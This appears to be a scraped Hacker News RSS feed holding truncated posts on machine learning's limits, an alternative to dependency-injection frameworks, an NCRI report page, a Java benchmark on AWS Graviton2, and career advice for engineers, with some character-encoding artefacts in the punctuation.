<p>These reviews spotlight machine learning‚Äôs major accomplishments so far and foretell even more substantial achievements to come. But most such reviews also remark on intelligent machines‚Äô limitations. Some impressive successes, for instance, reflect ‚Äúshortcut‚Äù learning that gets the right answer without true understanding. Consequently, apparently smart machines can be easily tricked into error. And much of today‚Äôs so-called machine intelligence is narrowly focused skill, effective for a specific task, but without the flexibility of the general cognitive abilities possessed by people. A computer that can beat grandmasters at chess would be mediocre at poker, for example.</p>



<p>‚ÄúIn stark contrast with humans, most ‚Äòlearning‚Äô in current-day artificial intelligence is not transferable between related tasks,‚Äù writes computer scientist Melanie Mitchell in her 2019 book <em>Artificial Intelligence: A Guide for Thinking Humans</em>.</p>



<p>As Mitchell explains, many barriers impede the quest for true artificial intelligence ‚Äî machines that can think and reason about the world in a general way as (at least some) humans can.</p>



<p>‚ÄúWe humans tend to overestimate artificial intelligence advances and underestimate the complexity of our own intelligence,‚Äù Mitchell writes. Fears of superintelligent machines taking over the world are therefore misplaced, she suggests, citing comments by the economist and behavioral scientist Sendhil Mullainathan: ‚ÄúWe should be afraid,‚Äù he wrote. ‚ÄúNot of intelligent machines. But of machines making decisions that they do not have the intelligence to make. I am far more afraid of machine stupidity than of machine intelligence.‚Äù</p>



<div><figure><img data-attachment-id="2024" data-permalink="https://sinapticas.com/417mt-a7wl/" data-orig-file="https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg" data-orig-size="333,500" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="417mt-a7wl" data-image-description="" data-medium-file="https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg?w=200" data-large-file="https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg?w=333" src="https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg?w=333" alt="" srcset="https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg 333w, https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg?w=100 100w, https://sinapticas.files.wordpress.com/2020/09/417mt-a7wl.jpg?w=200 200w" sizes="(max-width: 333px) 100vw, 333px"><figcaption>Computer scientist and scholar Melanie Mitchell‚Äôs 2019 book explains the capabilities and the limits of current artificial intelligence.</figcaption></figure></div>



<h2>Machine learning‚Äôs swift progress</h2>



<p>To be fair, computer scientists have developed some pretty powerful strategies for teaching machines how to learn. Typically such learning relies on some variant of computing systems known as <a href="https://www.knowablemagazine.org/article/technology/2018/truly-neurally-deeply" target="_blank" rel="noreferrer noopener">neural networks</a>. In a crude way, those networks emulate the human brain, with processing units based on the brain‚Äôs nerve cells, or neurons. In a traditional neural network, a layer of artificial neurons receives inputs that modify the strength of the connections to the neurons in another layer, where patterns in the input can be identified and reported to an output layer. Such an artificial neural network can ‚Äúlearn‚Äù how to classify input data as, say, an image of a cat.</p>



<p>In the last decade or so, the dominant machine learning strategy has relied on artificial neural networks with multiple layers, a method known as deep learning. A deep learning machine can detect patterns within patterns, enabling more precise classifications of input, exceeding the ability of even expert humans. A well-trained deep learning system can detect a signal of cancer in an CT scan that would elude a human radiologist‚Äôs eyes.</p>



<p>In some systems, the learning is ‚Äúsupervised,‚Äù meaning the machine is trained on labeled data. With unsupervised learning, machines are trained on large datasets without being told what the input represents; the computer itself learns to identify patterns that define categories or behaviors. In another approach, called reinforcement learning, a machine learns to respond to input with actions that are ‚Äúrewarded‚Äù (perhaps by adding numbers to a memory file) if they help achieve a goal, such as winning a game. Reinforcement learning demonstrated its power by producing the machine that beat the human champion in the game of Go.</p>



<p>But success at Go, while worthy of headlines, is not nearly as notable as machine learning‚Äôs more practical successes in such realms as medicine, industry and science.</p>



<figure><img data-attachment-id="2025" data-permalink="https://sinapticas.com/1mukvfmpi6emzopvcgv1rbg/" data-orig-file="https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg" data-orig-size="1350,621" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1mukvfmpi6emzopvcgv1rbg" data-image-description="" data-medium-file="https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=300" data-large-file="https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=672" src="https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=1024" alt="" srcset="https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=1024 1024w, https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=150 150w, https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=300 300w, https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg?w=768 768w, https://sinapticas.files.wordpress.com/2020/09/1mukvfmpi6emzopvcgv1rbg.jpeg 1350w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Professional Go player Lee Sodol, right, faced Google‚Äôs artificial intelligence program AlphaGo in a series of Go games in 2016. Google DeepMind‚Äôs lead programmer Aja Huang, left, placed the first stone during the final match. AlphaGo won many, but not all, games against its human competitors.</figcaption></figure>



<p>In medicine, machine learning has helped researchers cope with weaknesses in standard tests for treatment effectiveness. Medical trials testing disease treatments typically rely on average results to determine effectiveness, and can therefore miss possible benefits for small subgroups of patients. One trial, for instance, found that a weight-loss program did not reduce heart problems among people with diabetes. But a machine learning algorithm identified a subset of patients for which weight loss did reduce heart problems, as infectious disease expert Timothy Wiemken and computer scientist Robert Kelley noted in the 2020 <a href="https://www.annualreviews.org/doi/10.1146/annurev-publhealth-040119-094437" target="_blank" rel="noreferrer noopener"><em>Annual Review of Public Health</em></a> <em>.</em></p>



<p>Machine learning has also assisted in finding new drugs to test. ‚ÄúDeep learning has been widely applied to drug discovery approaches,‚Äù chemist Hao Zhu writes in the latest<em> <a href="https://www.annualreviews.org/doi/10.1146/annurev-pharmtox-010919-023324" target="_blank" rel="noreferrer noopener"><em>Annual Review of Pharmacology and Toxicology</em></a>. ‚ÄúThe current progress of artificial intelligence supported by deep learning has shown great promise in rational drug discovery in this era of big data.‚Äù</em></p>



<p><em>As with discovering new drugs for medical purposes, machine learning has proved productive in discovering new materials for industrial uses. Searching for ‚Äúsuperhard‚Äù materials resistant to wear and tear can be streamlined with machine learning algorithms, as in a case study described in the 2020 Annual Review of Materials Research. ‚ÄúThis case study ‚Ä¶ is an excellent example of the powerful role that machine learning can play in the identification of new structural materials,‚Äù materials scientist Taylor Sparks and colleagues <a href="https://www.annualreviews.org/doi/10.1146/annurev-matsci-110519-094700" target="_blank" rel="noreferrer noopener">wrote in that review</a>.</em></p>



<p><em>‚ÄúI am far more afraid of machine stupidity than of machine intelligence.‚Äù</em><em>Sendhil Mullainathan</em></p>



<p><em>While practical uses get the most attention, machine learning also offers advantages for basic scientific research. In high-energy particle accelerators, such as the Large Hadron Collider near Geneva, protons smashing together produce complex streams of debris containing other subatomic particles (such as the famous Higgs boson, discovered at the LHC in 2012). With bunches containing billions of protons colliding millions of times per second, physicists must wisely choose which events are worth studying. It‚Äôs kind of like deciding which molecules to swallow while drinking from a firehose. Machine learning can help distinguish important events from background noise. Other machine algorithms can help identify particles produced in the collision debris.</em></p>



<p><em>‚ÄúDeep learning has already influenced data analysis at the LHC and sparked a new wave of collaboration between the machine learning and particle physics communities,‚Äù physicist Dan Guest and colleagues wrote in the 2018 <a href="https://www.annualreviews.org/doi/10.1146/annurev-nucl-101917-021019" target="_blank" rel="noreferrer noopener"><em>Annual Review of Nuclear and Particle Science</em></a>.</em></p>



<p><em>Machine learning methods have been applied to data processing not only in particle physics but also in cosmology, quantum computing and other realms of fundamental physics, quantum physicist Giuseppe Carleo and colleagues point out in <a href="https://arxiv.org/abs/1903.10563" target="_blank" rel="noreferrer noopener">another recent review</a>.</em></p>



<p><em>‚ÄúIn parallel to the rise of machine learning techniques in industrial applications, scientists have increasingly become interested in the potential of machine learning for fundamental research,‚Äù Carleo and coauthors wrote last year in Reviews of Modern Physics.</em></p>



<h2><em>Limits on learning</em></h2>



<p><em>As Carleo and many other reviewers have emphasized, machine learning has its downsides. Its successes should not blind scientists to its faults.</em></p>



<p><em>‚ÄúA healthy and critical engagement with the potential power and limitations of machine learning includes an analysis of where these methods break and what they are distinctly not good at,‚Äù Carleo and coauthors wrote.</em></p>



<p><em>For ‚Ä¶</em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sinapticas.com/2020/09/18/why-some-artificial-intelligence-is-smart-until-its-dumb/">https://sinapticas.com/2020/09/18/why-some-artificial-intelligence-is-smart-until-its-dumb/</a></em></p>]]>
            </description>
            <link>https://sinapticas.com/2020/09/18/why-some-artificial-intelligence-is-smart-until-its-dumb/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519726</guid>
            <pubDate>Fri, 18 Sep 2020 17:46:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Alternative to Dependency Injection Frameworks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519596">thread link</a>) | @whack
<br/>
September 18, 2020 | https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/ | <a href="https://web.archive.org/web/*/https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><a href="https://blog.nrwl.io/essential-angular-dependency-injection-a6b9dcca1761" target="_blank" rel="noreferrer noopener"><img loading="lazy" data-attachment-id="163" data-permalink="https://software.rajivprab.com/di/" data-orig-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png" data-orig-size="1115,569" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="di" data-image-description="" data-medium-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=300" data-large-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=1024" src="https://softwarerajivprab.files.wordpress.com/2019/07/di.png" alt="" width="558" height="285" srcset="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=558&amp;h=285 558w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=150&amp;h=77 150w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=300&amp;h=153 300w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=768&amp;h=392 768w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=1024&amp;h=523 1024w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png 1115w" sizes="(max-width: 558px) 100vw, 558px"></a></figure></div>



<p><span>I have a confession to make. I hate </span><a href="https://en.wikipedia.org/wiki/Dependency_injection#Dependency_injection_frameworks" target="_blank" rel="noopener">Dependency Injection (DI) frameworks</a><span>. </span></p>



<p><span>My very first job as a Software Engineer involved working with a very complex system that powered a ~100 person hedge fund. We made extensive use of Dependency Injection‚Ä¶ but only via </span><a href="https://en.wikipedia.org/wiki/Dependency_injection#Constructor_injection" target="_blank" rel="noopener">Constructor or Setter Injection</a><span>. We did not use any DI frameworks at all. Little did I realize how lucky I was.</span></p>



<p><span>I have since worked with Java code bases, much less complex in scope, but absolutely littered with DI annotations everywhere. I‚Äôve worked with frameworks that took DI to the next level ‚Äì even method parameters were injected by other methods that dynamically produced them when needed. To my untrained eye, it seemed like a colossal mess. Tracing anything took forever. Everything was implicitly linked to everything else. Maintaining the configs for every app and every test was a chore. Things that could have been a simple compile-time error flagged by my IDE, instead exposed themselves as run-time errors that were a pain to debug and fix. </span></p>



<p><span>Is all this really necessary? Why do we need all these annotation-driven magically-wired DI frameworks?</span></p>



<h2><span>Dependency Graphs</span></h2>



<p><span>I went searching for an explanation, and found one from </span><a href="https://blog.drewolson.org/dependency-injection-in-go" target="_blank" rel="noopener">the following blog post</a><span>:</span></p>



<blockquote><p><i><span>The main downside is that it‚Äôs a pain to have to manually create the Config before we can create the Server. We‚Äôve created a dependency graph here ‚Äì we must create our Config first because of Server depends on it. In real applications these dependency graphs can become very large and this leads to complicated logic for building all of the components your application needs to do its job.</span></i></p></blockquote>



<p><span>He then goes on to give an example of a Server, which has a chain of dependencies ‚Äì all of which need to be constructed in sequence, by a centralized main function:</span></p>


<pre title="">func main() {
  config := NewConfig()
  db := ConnectDatabase(config)
  personRepository := NewPersonRepository(db)
  personService := NewPersonService(config, personRepository)
  server := NewServer(config, personService)
  server.Run()
}
</pre>


<p><span>His point presumably is that managing this dependency graph from a central location, can be complex and burdensome. Hence, it‚Äôs better to use a DI framework where you can specify how each dependency should be constructed, and they are all transitively invoked and initialized when needed.</span></p>



<p><span>I think that he is somewhat overstating the problems of constructor injection, but let‚Äôs assume for now that he‚Äôs right. Is there a different way to accomplish the above goal, without having to use a DI framework, and annotation-driven auto-wiring?</span></p>



<h2><span>An Alternative</span></h2>



<p><span>Turns out that I had run into a similar issue myself while working on some side projects. And I had solved them in a way that ‚Äúresembles‚Äù a DI framework, without actually using any DI framework or advanced language constructs. I‚Äôm probably biased, but this approach appears to be far simpler, while conferring similar benefits.</span></p>



<p><span>Context: </span></p>



<ol><li><span>We want to construct and run a Server instance</span></li><li><span>Server has a dependency on PersonService</span></li><li><span>PersonService has a dependency on PersonRepository and Config</span></li><li><span>PersonRepository has a dependency on Database</span></li><li><span>Database has a dependency on the same Config as above</span></li></ol>



<p><span>Suppose, as the author mentions, we do not want to use constructor injection in order to inject Config -&gt; Database + Config -&gt; PersonRepo -&gt; PersonService -&gt; Server. Suppose we want all dependencies to be lazily, and transitively constructed only when needed.</span></p>



<p><span>Consider the following:</span></p>


<pre title="">public class Toolbox {
  public static Config getConfig() {...}
  public static Database getDatabase() {...}
  public static PersonRepo getPersonRepo() {...}
  public static PersonService getPersonService() {...}
}
</pre>


<p><span>If you have the above fully implemented, it can be trivially used to replace framework-based dependency injection. For instance, suppose you have a class that has a dependency on Database. Instead of relying on the DI framework to inject Database, you can just fetch it from the Toolbox instead.</span></p>


<pre title="">@Inject
public PersonRepo(@Database Database db) {...}
</pre>


<p><span>Becomes:</span></p>


<pre title="">public PersonRepo() { this(Toolbox.getDatabase()); }
public PersonRepo(Database db) {...}
</pre>


<h2><span>Configuring the Toolbox</span></h2>



<p><span>That all sounds great, but where does </span><code>Toolbox.getDatabase()</code><span> get its return value from? There are many possible ways to implement this, depending on your specific application and testing needs.</span> Let‚Äôs look at a few of them.</p>



<p><span>Simplest possible option: construct a new instance every time:</span></p>


<pre title="">public class Toolbox {
  public static Database getDatabase() { 
    return DatabaseProvider.get(); }
  }
  
  private static class DatabaseProvider {
    static Database get() { 
      return buildDatabase(Toolbox.getConfig()); 
    }
  }
}
</pre>


<p><span>Or if you want to reuse the same Database instance every time, you can use a </span><a rel="noopener" href="https://stackoverflow.com/a/16106598/4816322" target="_blank">singleton holder with lazy-initialization</a><span>:</span></p>


<pre title="">class DatabaseProvider {
  static Database get() { return DefaultHolder.DEFAULT; }

  private static class DefaultHolder {
    private static final DEFAULT = buildDatabase(Toolbox.getConfig());
  }
}
</pre>


<p><span>And suppose you want the ability to inject custom instances, for testing purposes:</span></p>


<pre title="">// Restrict visibility to prevent access from unexpected sources
class DatabaseProvider {
  // throws exception if already set to a different value
  // Prevents any mutations from happening after the first value is set
  static void set(Database db) {...}

  // Returns a default if not set
  static Database get() {...}
}
</pre>


<p><span>And if you want all this to be thread-safe, you can use </span><a rel="noopener" href="https://dzone.com/articles/how-atomicreference-works-in-java" target="_blank">AtomicReference</a><span>. Or you could use a </span><a href="https://gitlab.com/whacks/cava/blob/master/src/main/java/org/rajivprab/cava/DynamicConstant.java"><span>simple utility class that manages thread safety, lazy init, defaults, and immutability</span></a><span>, in order to implement all this in just 5 lines of code.</span></p>


<pre title="">class DatabaseProvider {
  private static final DynamicConstant INSTANCE = 
    DynamicConstant.withDefault(() -&gt; buildDatabase(Toolbox.getConfig()));

  // throws exception if instance is already set to a different value
  // Prevents any mutations from happening after the first value is set
  static void set(Database db) { INSTANCE.set(db); }

  static Database get() { return INSTANCE.get(); }
}
</pre>


<p>You can customize this to fit any particular requirements you have. Thread-safety, immutability, defaults, singletons vs suppliers, injecting fakes for tests ‚Äì you can implement any of these simply by customizing the DatabaseHolder implementation.</p>



<p><span>Notice that this automatically manages your dependency graph as well. When&nbsp;<code>Toolbox.getDatabase()</code> is invoked, that invokes <code>DatabaseProvider.get()</code>,&nbsp;which will then invoke <code>Toolbox.getConfig()</code><em> </em>if needed, which might in turn transitively invoke its own dependencies via the Toolbox as well.</span></p>



<p><span>In this way, <code>PersonRepo</code> only needs to call <code>Toolbox.getDatabase()</code>, and all transitive dependencies are lazily initialized or constructed (if needed), in order to generate the Database instance.</span></p>



<h2>So‚Ä¶ Service Locators?</h2>



<p>Given the superficial similarity to <a href="https://en.wikipedia.org/wiki/Service_locator_pattern" target="_blank" rel="noopener">Service Locators</a>&nbsp;(SL), it‚Äôs easy to see why this might seem like a reincarnation of an old idea. However, there are some major differences between the approach described above, and a traditional SL pattern. Differences that completely change the way the system feels and operates.</p>



<p>First, unlike a SL, the above approach cannot be used to request any arbitrary object. The Toolbox only has specific methods defined, such as <code>getDatabase()</code>, which return specific objects. You cannot simply invoke <code>Toolbox.get(MyCustomObject.class)</code>, like you can with a SL.</p>



<p>This restriction might seem like a limitation. But it actually makes your code much safer. It guarantees that all Toolbox users are only using it to request objects that have been explicitly planned for and added to the Toolbox interface. It also allows for programmers to easily figure out which dependencies they can safely get from the Toolbox, and which ones they have to get elsewhere.</p>



<p>The above also provides an additional level of safety: you can ensure that every method exposed by the Toolbox, comes with a default supplier. A default supplier that eliminates any worries that the Toolbox wasn‚Äôt properly initialized prior to use. A default supplier that transitively constructs its own dependencies using the Toolbox recursively.</p>



<p>In fact, the right way to do it would be to define default suppliers that always return something that works, and is intended for production use. This way, when running in prod, your code should never have to set any values in the toolbox. It can simply get the lazy-constructed defaults whenever needed. The only use case for setting something in the Toolbox, would be for testing purposes when you want to inject a fake.</p>



<p>Lastly, a SL is designed and intended to be extremely flexible, by allowing for instance injection at any time. This can be a powerful tool, if your application needs such dynamic abilities. However, it can also lead to complex interactions and side-effects as different parts of the application interfere with each other in unintentional or non-intuitive ways.</p>



<p>The Toolbox approach described above isn‚Äôt expressly designed to have such capabilities. If you look at the various set methods, you can see that they are programmed to throw exceptions if they conflict with a previously set value. This means that as soon as a value is set, it is then frozen for the rest of the application‚Äôs lifespan. You can always customize this in any way you want, by changing the Provider implementation ‚Äì but I would recommend enforcing some form of consistency.</p>



<p>Combine all of these differences, and you get something that‚Äôs completely different from a Service Locator in terms of its uses and drawbacks.</p>



<h2>But Singletons are Bad?</h2>



<p>With respect to Singletons, there‚Äôs little difference between the Toolbox approach above, and what you would do with DI frameworks. If you want a new instance every time, you can configure the DatabaseProvider to construct a new instance every time. Alternatively, if you prefer to reuse the same instance every time because ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/">https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/</a></em></p>]]>
            </description>
            <link>https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519596</guid>
            <pubDate>Fri, 18 Sep 2020 17:34:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Network-Enabled Anarchy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519511">thread link</a>) | @bra-ket
<br/>
September 18, 2020 | https://ncri.io/reports/network-enabled-anarchy/ | <a href="https://web.archive.org/web/*/https://ncri.io/reports/network-enabled-anarchy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content" role="main">
	<div>
		<div>
			<div>
			    			    <article id="post-447">
				    <header>
					    <p>Contagion and Ideology Report</p>
					    
					    <p>Contributors:</p>
					    <div><p>Joel Finkelstein, Corresponding Author<br>
The Network Contagion Research Institute<br>
The James Madison Program in American Ideals and Institutions, Princeton University<br>
Miller Center for Community Protection and Resilience<br>
Rutgers, the State University of New Jersey<br>
joel@ncri.io</p><p>

Alex Goldenberg, Author<br>
The Network Contagion Research Institute<br>
alex@ncri.io</p><p>

Sean Stevens, Author<br>
Advisor, The Network Contagion Research Institute</p><p>

Lee Jussim, Author<br>
Chair, Distinguished Professor, Department of Psychology<br>
Rutgers, the State University of New Jersey</p><p>

John Farmer, Author<br>
Former New Jersey State Attorney General and Chief Counsel, 9/11 Commission<br>
Director, Miller Center for Community Protection and Resilience<br>
Rutgers, the State University of New Jersey</p><p>

John K. Donohue, Author<br>
NYPD Chief of Strategic Initiatives (Ret.)</p><p>

Pamela Paresky, Author<br>
University of Chicago</p></div>
				    </header>
				    <section>
					    					    
<p><a href="https://ncri.io/wp-content/uploads/NCRI-White-Paper-Network-Enabled-Anarchy-14-Sept-1049am.pdf" target="_blank" rel="noreferrer noopener">Download Here</a></p>



<a href="https://ncri.io/wp-content/uploads/NCRI-White-Paper-Network-Enabled-Anarchy-14-Sept-1049am.pdf">NCRI White Paper Network Enabled Anarchy 14 Sept 1049am</a>
					    
					</section>
				</article>
			    			    			    
			</div>
			
		</div>
	</div>
</section></div>]]>
            </description>
            <link>https://ncri.io/reports/network-enabled-anarchy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519511</guid>
            <pubDate>Fri, 18 Sep 2020 17:28:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing a real-world Java-based application on Amazon's Arm-based Graviton2]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519510">thread link</a>) | @JacobiX
<br/>
September 18, 2020 | https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/ | <a href="https://web.archive.org/web/*/https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="tm-row-5f685ddd3d6cb"><div id="tm-column-5f685ddd3d936"><div><div><div><div><blockquote><p> ‚ÄúARM-based built on the Nitro servers for typical LOB-applications</p></blockquote><p>The T4g instances are low cost version of the ARM based VMs. According to Amazon you can enjoy a performance benefit of up to <strong>40%</strong> at a <strong>20%</strong> lower cost in comparison to T3 instances.</p><p>We deployed Reis‚Ñ¢ a Java-based application and measured the performance of some typical production payloads. The idea is to deploy a real-world app that uses some popular technologies: PostgreSQL, Java 8, nginx, angular, and Elasticsearch and quickly evaluate the performance of the system.</p></div></div><div><figure><p><img width="573" height="150" src="https://www.vneuron.com/wp-content/uploads/2020/09/tab1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/tab1.png 573w, https://www.vneuron.com/wp-content/uploads/2020/09/tab1-300x79.png 300w" sizes="(max-width: 573px) 100vw, 573px"></p></figure></div><div><div><p>Most of the needed packages were already available in yum package manager, the installation process was smooth and the installed components worked out of the box. For PostgreSQL, unfortunately, the default yum package is quite outdated (v9). You need to use the Extras catalog to get the version 10.</p><p>For Java JDK, since we use OpenJDK we decided to use Amazon Corretto 8, strangely enough and unlike Amazon Corretto 11 the version 8 is not included in the package manager. So we installed manually the AARCH64 version (again everything worked as documented). After installing nginx, preparing a test database, and configuring the remaining dependencies we were ready to test the setup</p><p>After starting the services, the first thing that I noticed was the horrendous startup time of Java applications. It was unbelievably slow, almost an hour to start the application! for sure I know that it can takes a couple of minutes to start this complex monolithic backend, but if it takes an hour there is something wrong with the setup.</p></div></div><div><div><p>After some sanity checks I couldn‚Äôt figure out the root cause of the problem, after calling for assistance from our team, they quickly identified the issue: <strong>dev/random</strong> runs out of available entropy. The app was waiting for <strong>/dev/random</strong> to provide randomness and <strong>/dev/random</strong> typically blocks if there is less entropy available than requested. They suggested that I switch to <strong>/dev/urandom</strong> as the source of cryptographic randomness. A call to cat <strong>/proc/sys/kernel/random/entropy_avail</strong> returns values in the range 70-100. We switched to<strong> /dev/urandom</strong> and now we have a more reasonable boot time (under a minute)!</p><p>Excerpt<b> from /usr/lib/jvm/amazon-corretto-8.265.01.1-linux-aarch64/jre/lib/security/java.security </b></p></div></div><div><figure><p><img width="318" height="120" src="https://www.vneuron.com/wp-content/uploads/2020/09/image1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/image1.png 318w, https://www.vneuron.com/wp-content/uploads/2020/09/image1-300x113.png 300w" sizes="(max-width: 318px) 100vw, 318px"></p></figure></div><div><p><b>Maybe the Amazon Corretto for AARCH64 distribution shoud use /dev/urandom by default?</b></p></div><div><p>Benchmarking with Bombardier</p></div><div><p>The objective is to determine whether the performance of this Graviton2 based VM are quite competitive. In order to have a baseline, we created an x86 VM with equivalent characteristics (but +27% of the price).</p></div><div><figure><p><img width="566" height="187" src="https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1.png 566w, https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1-300x99.png 300w" sizes="(max-width: 566px) 100vw, 566px"></p></figure></div><div><div><p>Since the two VMs have the same OS, we used the exact same scripts to install the dependencies, to deploy the apps and to benchmark it using Bombardier!</p><p><a href="https://github.com/codesenberg/bombardier" target="_blank" rel="noopener noreferrer">Bombardier</a> is a HTTP(S) benchmarking tool. It is written in Go programming language. We compiled it on both VMs.</p><p>We designed 8 production workloads, involving database CRUD, data indexing, search and data encryption and transfer. For each payload we performed 10 tests and picked the median, after each iteration we restarted the jvm.</p></div></div><div><figure><p><img width="640" height="394" src="https://www.vneuron.com/wp-content/uploads/2020/09/screen1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/screen1.png 702w, https://www.vneuron.com/wp-content/uploads/2020/09/screen1-300x185.png 300w" sizes="(max-width: 640px) 100vw, 640px"></p></figure></div><div><figure><p><img width="640" height="395" src="https://www.vneuron.com/wp-content/uploads/2020/09/screen2.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/screen2.png 897w, https://www.vneuron.com/wp-content/uploads/2020/09/screen2-300x185.png 300w, https://www.vneuron.com/wp-content/uploads/2020/09/screen2-768x474.png 768w" sizes="(max-width: 640px) 100vw, 640px"></p></figure></div><div><div><p>I should admit that I‚Äôm pleasantly surprised with the performances of the ARM version of OpenJDK.</p><p>As with any small-scale benchmark we should take it with grain of salt, but we will definitely perform more extensive tests in the upcoming week.</p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519510</guid>
            <pubDate>Fri, 18 Sep 2020 17:28:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stop just using ‚ÄúFront end‚Äù or ‚ÄúBack end‚Äù to describe the Engineering you like]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24519400">thread link</a>) | @lord_sudo
<br/>
September 18, 2020 | https://www.michellelim.org/writing/stop-using-frontend-backend/ | <a href="https://web.archive.org/web/*/https://www.michellelim.org/writing/stop-using-frontend-backend/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p><strong><em>Also posted on Medium <a href="https://medium.com/@michlim97/stop-just-using-frontend-or-backend-to-describe-the-engineering-you-like-e8c392956ada">here</a>.</em></strong></p>
<p>
<img src="https://www.michellelim.org/writing/stop-using-frontend-backend/images/fe-be-cover-photo.png" alt="Stop Using Frontend Backend Cover Photo">
</p>
<p>If there is one tip I could share with my fellow new engineers, it would be‚Ä¶ Stop relying on the ‚ÄúFrontend/Backend‚Äù axis to understand the engineering you like. <strong>The ‚ÄúFrontend/Backend‚Äù axis doesn‚Äôt map well to engineers‚Äô motivations.</strong> If you only use that axis, you can end up in projects you don‚Äôt like or worse still, give up on engineering prematurely. <strong>Instead, try using the ‚ÄúProduct/Infrastructure‚Äù axis as the first axis to understand your career preference.</strong></p>
